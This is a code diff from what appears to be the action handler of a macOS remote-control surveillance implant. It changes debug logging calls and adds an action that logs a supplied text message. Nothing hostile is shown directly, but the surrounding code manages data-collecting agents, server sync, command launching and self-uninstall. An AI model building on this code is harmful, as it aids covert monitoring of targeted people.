@@ -10,6 +10,7 @@
 
 #import "RCSMActions.h"
 #import "RCSMTaskManager.h"
+#import "RCSMInfoManager.h"
 
 #import "RESTNetworkProtocol.h"
 
@@ -253,13 +254,13 @@
               bSuccess = [taskManager startAgent: LOGTYPE_DEVICE];
 
 #ifdef DEBUG_ACTIONS
-              NSLog(@"%s: sync performed... restarting DEVICE Agent %d", __FUNCTION__, bSuccess);
+              verboseLog(@"sync performed. restarting DEVICE Agent %d", bSuccess);
 #endif
             }
           else
             {
 #ifdef DEBUG_ACTIONS
-              NSLog(@"%s: sync performed... DEVICE Agent dont restarted", __FUNCTION__);
+              verboseLog(@"sync performed. DEVICE Agent dont restarted");
 #endif
             }
         }
@@ -284,7 +285,7 @@
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
 {
 #ifdef DEBUG_ACTIONS
-  infoLog(@"");
+  verboseLog(@"");
 #endif
 
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
@@ -330,7 +331,7 @@
 - (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
 {
 #ifdef DEBUG_ACTIONS
-  infoLog(@"");
+  verboseLog(@"");
 #endif
 
   [aConfiguration retain];
@@ -386,7 +387,7 @@
   [aConfiguration retain];
   
 #ifdef DEBUG_ACTIONS
-  NSLog(@"Action Uninstall started!");
+  infoLog(@"Action Uninstall started!");
 #endif
     
   [taskManager uninstallMeh];
@@ -396,6 +397,29 @@
   
   [aConfiguration release];
   
+  return TRUE;
+}
+
+- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
+{
+  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  [aConfiguration retain];
+
+  NSData *stringData = [aConfiguration objectForKey: @"data"];
+
+#ifdef DEBUG_ACTIONS
+  verboseLog(@"Action Info started");
+#endif
+
+  NSString *text = [[NSString alloc] initWithData: stringData
+                                         encoding: NSUTF16LittleEndianStringEncoding];
+  
+  [infoManager logActionWithDescription: text];
+  
+  [text release];
+  [aConfiguration release];
+  [infoManager release];
+
   return TRUE;
 }
 
